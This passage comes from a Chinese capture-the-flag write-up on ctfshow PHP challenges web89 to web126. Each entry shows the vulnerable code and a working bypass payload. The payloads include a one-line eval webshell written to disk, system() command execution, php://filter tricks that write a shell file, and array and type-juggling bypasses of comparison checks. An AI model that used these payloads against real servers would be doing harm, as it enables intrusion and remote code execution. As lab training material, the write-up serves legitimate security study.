die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\n\n这里`preg_match(\"/[0-9]/\", $num`过滤了数字，但是\n\n我们要让`intval($num)`为真，这题考的就是`intval`的特性\n\n\n\n**intval()的测试**\n\n> 返回值 \n> 成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array \n> 返回 1。 \n\n测试了一下\n\n```\n<?php\n\necho intval(1234);  //1234\necho \"\\n\";\necho intval(042);  //34  0开头的，当成了8进制\necho \"\\n\";\necho intval(0x1a);  //26 0x开头，当成16进制\necho \"\\n\";\necho intval(3e3);  //3000 科学计数法 3 X 10的三次方\necho \"\\n\";\necho intval('3e3');  //3000\necho \"\\n\";\necho intval(\"1234a\");  //1234\necho \"\\n\";\necho intval(4.2); //转化为整数\n```\n\n回到题目\n\n可以用数组绕过\n\n```\n?num[]=a\n```\n\n\n\n### web90\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n} \n```\n\n与上题类似，但这次没过滤数字\n\n这里又要说一下`intval`的相关特性\n\n```\nintval ( mixed $var [, int $base = 10 ] )\n```\n\n> 如果 `base` 是 0，通过检测 `var` 的格式来决定使用的进制：\n>\n> - 如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，\n> - 如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，\n> - 将使用 10 进制 (decimal)。\n\n```\nintval('4476a',0)=4476\nintval('010574',0)=4476\nintval('0x117c',0)=4476\n```\n\n上述三中均能绕过\n\n\n\n### web91\n\n```\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n} \n```\n\n我们先来看看 `正则匹配修饰符`\n\n```\ni 不区分(ignore)大小写；\ng 全局(global)匹配\nm 多(more)行匹配\ns 特殊字符圆点 . 中包含换行符\nU 只匹配最近的一个字符串;不重复匹配; \n//修正符:x 将模式中的空白忽略; \n//修正符:A 强制从目标字符串开头匹配;\n//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; \n//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  \n```\n\n`(preg_match('/^php$/im', $a))`这个匹配以php开头的字符串并且多行匹配\n\n`(preg_match('/^php$/i', $a))`这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行\n\n\n\n> preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾\n\n\n\n`%0a`换行，相当于enter\n\n**payload**\n\n```\n?cmd=%0aphp\n或?cmd=php%0a1   (但php%0a不行)\n```\n\n这里我有个小小的疑惑点，针对第一个 `%0aphp`显然这里是匹配的第一行，第二个payload `php%0a1`，显然这里匹配的是第二行，所以具体的匹配机制有点没懂\n\n请假了一下群里的师傅这里主要跟`^php$`这个有关，`(preg_match('/^php$/i', $a))`这个以一整行为一个整体进行判断，经过测试这个只匹配第一行\n\n\n\n### web92\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n\n\n> intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法\n\n所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过\n\n**payload**\n\n```\n?num=0b1000101111100\n?num=0x117c\n?num=4476e123\n```\n\n\n\n### web93\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    } \n```\n\n比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，\n\n八进制是以数字0开头的，刚好可以绕过\n\n```\n?num=010574\n```\n\n\n\n### web94\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n这一题相对于上一题，不让数字0出现在第一位,而且第一个if是`===`强比较\n\n我们可以用小数 `4476.0`绕过 或者\n\n```\n?num=4476.0\n```\n\n可以在前面加上一个加号，当空格\n\n```\n?num=+010574\n?num= 010574//空格也可以\n```\n\n\n\n### web95\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n这里第一个判断又换成弱比较了，只能用 空格和 `+` 绕过\n\n```\n?num= 010574\n?num=+010574\n```\n\n\n\n### web96\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n\n\n} \n```\n\n这题没什么过滤直接读当前目录下的flag.php就好\n\n```\n?u=./flag.php\n```\n\n或者用伪协议读取也行\n\n```\n?u=php://filter/resource=flag.php\n```\n\n\n\n### web97\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif (isset($_POST['a']) and isset($_POST['b'])) {\nif ($_POST['a'] != $_POST['b'])\nif (md5($_POST['a']) === md5($_POST['b']))\necho $flag;\nelse\nprint 'Wrong.';\n}\n?> \n```\n\n题目需要我们用post方式传入a和b，并且a!=b（这里是弱比较）\n\n但这里`md5($_POST['a']) === md5($_POST['b'])`这里我们可以利用一个字符串比较的一个特性\n\n> MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL\n\n```\na[]=1&b[]=2\n```\n\n\n\n### web98\n\n```\ninclude(\"flag.php\");\n$_GET?$_GET=&$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n?> \n```\n\n```\n`$_GET?$_GET=&$_POST:'flag';` \n```\n\n这句话解释一下，这是三目运算符\n\n当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag\n\n```\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n```\n\n如果传的flag='flag',则把COOKIE传参地址给get,否则让其等于'flag'\n\n```\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; \n```\n\n如果传的flag='flag',则把SERVER传参地址给get,否则让其等于'flag'\n\n```\n$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__\n```\n\n如果传入的HTTP_FLAG=‘flag'显示$flag，否则显示当前页面\n\n\n\n如果我们直接用get方式传入\n\n```\n?HTTP_FLAG=flag\n```\n\n由于存在GET传参，会把post传参地址给get\n\n所以这里我们随便用get方式传入一个，然后用post覆盖掉\n\n```\n?num=1111\n\npost:HTTP_FLAG=flag\n```\n\n即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值\n\n\n\n### web99\n\n```\nhighlight_file(__FILE__);\n$allow = array();\nfor ($i=36; $i < 0x36d; $i++) { \n    array_push($allow, rand(1,$i));\n}\nif(isset($_GET['n']) && in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n\n?> \n```\n\n`array_push`\n\n> array_push — 将一个或多个单元压入数组的末尾（入栈）\n\n`in_array`\n\n> 检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较\n\n分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中\n\n由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）\n\n然后是 1.php在进行判断时 `1.php == 1`\n\n并将一句话木马写入content\n\n```\n?n=1.php\n\nPOST:content=<?php @eval($_POST[1]);?>\n```\n\n蚁剑连接即可\n\n\n\n### web100\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n`is_numeric`\n\n> — 检测变量是否为数字或数字字符串\n\n这个题第一次做的时候时非常懵逼的\n\n这题的解题点在\n\n```\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n```\n\n这里就要讲一下运算符的优先级问题了\n\n```\n&& --> || --> = --> and --> or\n```\n\n所以题目这里赋值的优先级大于and，即\n\n```\n$v0=is_numeric($v1)\n```\n\n所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，\n\n现在就要解决\n\n```\neval(\"$v2('ctfshow')$v3\");\n```\n\n突然发现题目注释里有  `flag in class ctfshow; `\n\n我这里直接用管道符了`||`\n\n```\n?v1=1&v2=system(\"cat ctfshow.php\")||&v3=;\n```\n\n\n\n### web101\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n这个题相比上个，增加了许多过滤\n\n主要还是构造\n\n```\neval(\"$v2('ctfshow')$v3\"); \n```\n\n这里也是看了很多师傅的wp才理解，需要讲一下\n\n`ReflectionClasss`\n\n> 反射类ReflectionClass执行命令\n>\n> ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作\n> 反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system('cmd'))来执行命令\n\n\n\n**payload**\n\n```\n?v1=1&v2=echo new ReflectionClass&v3=;\n```\n\n最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯\n\n\n\n### web102\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n\n\n?>\n```\n\n`substr`\n\n> **substr** ( string `$string` , int `$start` [, int `$length` ] ) : string\n>\n> 返回字符串 `string` 由 `start` 和 `length` 参数指定的子字符串。\n\n这里 `$s = substr($v2,2);`截取了v2的[2:],从第三个字符到末尾\n\n`call_user_func`\n\n> **call_user_func** ( [callable](php/language.types.callable.html) `$callback` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](php/language.pseudo-types.html#language.types.mixed)\n>\n> 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。\n\n这里v1，v3可控，v2要保证能写shell，又要保证能为数字。\n\n这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！\n\n```\n<?=`tac *`;  \n```\n\n这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母\n于是在此之前进行base64编码一次\n\n```\nPD89YHRhYyAqYDs= //在进行hex编码\n```\n\n```\n5044383959485268597941715944733d\n```\n\n这时我们发现 `3d`为等号\n\n即v1=hex2bin  v2=00504438395948526859794171594473  v3=php://1.php\n\n**payload**\n\n```\nPOST:v1=hex2bin\n\n?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n太妙了！！\n\n\n\n### web103\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n} \n```\n\n过滤的更加多了，用上一题的思路也能解出来，我换一个吧\n\n```\n<?=`cat *`;\n```\n\n转化为base64\n\n```\nPD89YGNhdCAqYDs\n```\n\n再转化为ascii的十六进制\n\n```\n5044383959474e6864434171594473\n```\n\n我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，\n\npayload\n\n```\n?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n### web104\n\n```\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n} \n```\n\n数组绕过，sha(a[])会返回null  而null==null\n\n\n\n### web105\n\n```\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='你还想要flag嘛？';\n$suces='既然你想要那给你吧！';\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces); \n```\n\n这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖\n\n```\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value; \n```\n\n这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE\n\n最后这里 `$$key=$$value;` 这里key不能等于error，于是\n\n我们传入 `suces=flag`\n\n这样 `$suces=$flag`这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error\n\n同理，我们用post方式传入 `error=suces`\n\n```\n$errot=$suces=$flag\n```\n\n最后由于不成立\n\n```\nif(!($_POST['flag']==$flag)){\n    die($error); \n```\n\n将error打印出来，此时error的值就是flag\n\n**payload**\n\n```\n?suces=flag\n\nPOST:error=suces\n```\n\n\n\n### web106\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) && $v1!=$v2){\n        echo $flag;\n    }\n} \n```\n\n数组绕过，这里不重复讲了。。\n\n\n\n### web107\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n\n} \n```\n\n`parse_str`\n\n> **parse_str** ( string `$encoded_string` [, array `&$result` ] ) : void\n>\n> 如果 `encoded_string` 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 `result` 则会设置到该数组里 ）。\n\n这里我们传入v3=flag\n\n`v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc`（其实就是flag经过md5后的值）\n\n**payload**\n\n```\n?v3=flag\nPOST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null==null\n\n```\n?v3[]=\nPOST:V1=\n```\n\n\n\n### web108\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n\n}\n//只有36d的人才能看到flag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n```\n\n其实这个题就考了一个知识点\n\nereg函数可以用%00截断\n\npayload\n\n```\n?c=a%00778\n```\n\n\n\n### web109\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n\n} \n```\n\n正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。\n初始化$v1，v1是个类，$v2()是参数。\n\n这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error\n`__toString()`：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。\n\n> PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效\n\n所以echo使得`$v1`类触发`__toString()`，传递的参数v2会被输出。\n\n**payload**\n\n```\n?v1=CachingIterator&v2=system(ls)\n?v1=Exception&v2=system('cat fl36dg.txt') \n```\n\n\n\n### web110\n\n```\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n\n    eval(\"echo new $v1($v2());\");\n\n} \n```\n\n以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构\n\n**payload**\n\n```\n?v1=FilesystemIterator&v2=getcwd\n```\n\n回显fl36dga.txt\n\n访问url/fl36dga.txt得到flag\n\n其实这里的`FilesystemIterator`没咋弄懂，还需要找师傅请教一下\n\n后续\n\n稍微懂了一点\n\n> 通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径\n\n```\n<?php\n\terror_reporting(0);\n\techo getcwd().PHP_EOL;\n\techo new FilesystemIterator('./').PHP_EOL;\n\techo new FilesystemIterator(getcwd());\n?>\n输出为\nD:\\PHP\n  index.php\n  index.php\n```\n\n\n\n### web111\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&$v1,&$v2){\n    eval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n}\n\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n     \n```\n\n当v1传入ctfshow，执行getFlag函数\n\n```\neval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n```\n\n也就是$ctfshow=$$v2,然后将$$v1打印出来\n\n我们另`v2=GLOBALS`\n\n```\nvar_dump($GLOBALS);\n```\n\npayload\n\n```\n?v1=ctfshow&v2=GLOBALS\n```\n\n\n\n### web112\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`is_file`\n\n> 判断给定文件名是否为一个正常的文件。\n\nis_file用php伪协议即可绕过\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web113\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n\n```\n\n这题过滤掉了filter，这个协议就用不了，这里增加一点知识点\n\n**linux里`/proc/self/root`是指向根目录的**\n\n也就是如果在命令行中输入`ls /proc/self/root`，其实显示的内容是根目录下的内容\n\n这里我们多次重复即可绕过`is_file`\n\npayload\n\n```\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n另一种解法\n\n```\ncompress.zlib://flag.php\n```\n\n应该是把flag.php当成压缩文件来读取，具体的不知道。\n\n\n\n### web114\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"师傅们居然tql都是非预期 哼！\";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`compress`和`root`被ban掉了，\n\n山重水复疑无路，柳暗花明又一村\n\n`filter`没有ban\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web115\n\n```\ninclude('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\"; \n```\n\n`trim`\n\n>  去除字符串首尾处的空白字符（或者其他字符）\n>\n>  果不指定第二个参数，**trim()** 将去除这些字符\n>\n>  - \" \" (ASCII *32* (*0x20*))，普通空格符。\n>  - \"\\t\" (ASCII *9* (*0x09*))，制表符。\n>  - \"\\n\" (ASCII *10* (*0x0A*))，换行符。\n>  - \"\\r\" (ASCII *13* (*0x0D*))，回车符。\n>  - \"\\0\" (ASCII *0* (*0x00*))，空字节符。\n>  - \"\\x0B\" (ASCII *11* (*0x0B*))，垂直制表符。\n\n这里我们写了个脚本\n\n```\n <?php\nfor($i=1;$i<=128;$i++){\n    $a=chr($i).'1';\n    if(trim($a)!=='1'&&is_numeric($a)){\n        echo urlencode(chr($i));\n        echo \"\\n\";\n    }\n    \n}\n```\n\n最后跑出来的结果是 %0c(换页符)\n\npayload\n\n```\n?num=%0c36\n```\n\n\n\n### web123\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&&$c<=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n```\n\n这里有个很坑的点\n\n> 在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：`CTF[SHOW.COM`=>`CTF_SHOW.COM`\n\n也就是说当我面`POST`  `CTF_SHOW.COM`时，会自动解析成`CTF_SHOW_COM`\n\npayload\n\n```\nPOST: CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag\n```\n\n\n\n### web125\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&&$c<=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\n相比于上一题，题目过路的更多了，echo这些打印函数被过滤\n\n这里我们详细看\n\n```\n$a=$_SERVER['argv'];\n```\n\n> $_SERVER['argv']：\n>\n> 1、cli模式（命令行）下\n>\n> \t第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n>\n> 2、web网页模式下\n>\n> \t在web页模式下必须在php.ini开启register_argc_argv配置项\n> \t\t\n> \t设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n> \t\t\n> \t这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n> \t\t\n> \t$argv,$argc在web模式下不适用\n\n```\n我们是在网页模式下的，注意重点：\n$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句\n```\n\npayload\n\n```\n?$fl0g=flag_give_me;\n\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=eval($a[0])\n```\n\n另一种思路\n\n这里没有过滤`highlight_file()`于是我们可以构造\n\n```\nfun=highlight_file($_GET[1])\n```\n\npayload\n\n```\n?1=flag.php\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=highlight_file($_GET[1])\n```\n\n\n\n### web126\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) && strlen($c)<=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\n与上题一样，这回多给几个payload\n\n```\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n```\n\n数组中用加号(加号在url中起到空格的作用)分隔`$a[1]`对应的就是`fl0g=flag_give_me`，所以下面这种也是可以的\n\n```\nget: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用\npost: 